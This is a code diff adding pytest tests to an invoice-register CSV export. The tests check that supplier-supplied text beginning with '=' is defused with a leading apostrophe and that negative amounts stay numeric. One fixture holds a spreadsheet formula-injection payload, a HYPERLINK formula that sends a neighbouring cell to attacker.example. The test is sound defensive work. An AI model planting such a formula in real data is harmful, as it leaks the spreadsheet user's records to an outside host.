@@ -1,6 +1,8 @@
 """Pre-filing validation, the portal JSON shapes, and the export endpoints."""
 from __future__ import annotations
 
+import csv
+import io
 import json
 from datetime import date
 from decimal import Decimal
@@ -547,6 +549,58 @@ def test_csv_uses_crlf_for_excel(db_session, business):
 def test_csv_of_an_empty_period_is_just_the_header(db_session, business):
     body = filing_service.to_csv(db_session, business, PERIOD, InvoiceType.SALES)
     assert body.strip().count("\r\n") == 0
+
+
+def test_csv_does_not_hand_a_supplier_a_formula_in_the_ca_s_spreadsheet(
+    db_session, business
+):
+    """A trade name is free text, and this file is opened in Excel by design.
+
+    The name arrives from an uploaded invoice, so it is chosen by whoever sent
+    the invoice rather than by the business exporting the register. Excel runs
+    any cell starting with "=", so without the guard a supplier can make the
+    accountant's spreadsheet fetch a URL carrying the row beside it.
+    """
+    save(
+        db_session,
+        business.id,
+        sale(
+            invoice_number="=1+1",
+            counterparty_name='=HYPERLINK("http://attacker.example/?"&A2,"Open")',
+        ),
+    )
+
+    body = filing_service.to_csv(db_session, business, PERIOD, InvoiceType.SALES)
+    row = next(iter(csv.DictReader(io.StringIO(body))))
+
+    assert row["invoice_number"] == "'=1+1"
+    assert row["counterparty_name"].startswith("'=")
+    # Defused, not deleted: the register still records what the invoice said.
+    assert "attacker.example" in row["counterparty_name"]
+
+
+def test_csv_leaves_a_negative_amount_as_a_number(db_session, business):
+    """A credit note's minus sign is arithmetic, not an injection.
+
+    The numeric columns are formatted by this application rather than typed by
+    anyone, so putting them through the formula guard would turn every credit
+    note into text that no spreadsheet will total.
+    """
+    save(db_session, business.id, sale(taxable_value=Decimal("-1000.00")))
+
+    row = next(
+        iter(
+            csv.DictReader(
+                io.StringIO(
+                    filing_service.to_csv(
+                        db_session, business, PERIOD, InvoiceType.SALES
+                    )
+                )
+            )
+        )
+    )
+
+    assert row["taxable_value"] == "-1000.00"
 
 
 # ---------------------------------------------------------------------------
